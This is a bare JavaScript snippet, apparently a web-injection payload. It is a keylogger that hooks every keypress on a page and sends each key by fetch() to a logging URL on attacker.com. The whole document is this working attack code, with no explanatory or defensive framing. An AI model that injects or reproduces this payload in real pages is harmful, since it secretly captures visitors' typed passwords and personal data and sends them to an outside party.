document.onkeypress = function(e){
  fetch('http://attacker.com/log?key=' + e.key);
};
